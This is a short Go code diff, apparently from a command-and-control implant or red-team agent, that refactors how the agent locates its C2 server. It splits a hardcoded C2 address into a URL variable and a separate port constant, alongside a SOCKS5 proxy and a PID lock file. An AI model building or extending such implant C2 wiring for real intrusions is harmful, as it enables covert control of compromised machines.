@@ -21,14 +21,17 @@ var (
 
 	// ProxyServer Socks5 proxy listening on port 10800
 	ProxyServer *socks5.Server
+
+	// CCAddress how our agent finds its CC
+	CCAddress = "https://10.103.249.16"
 )
 
 const (
 	// PIDFile stores agent PID
 	PIDFile = "/tmp/e.lock"
 
-	// CCAddress how our agent finds its CC
-	CCAddress = "https://10.103.249.16:8000/"
+	// CCPort port of c2
+	CCPort = "8000"
 
 	// CCIndicator check this before trying connection
 	CCIndicator = "[cc_indicator]"
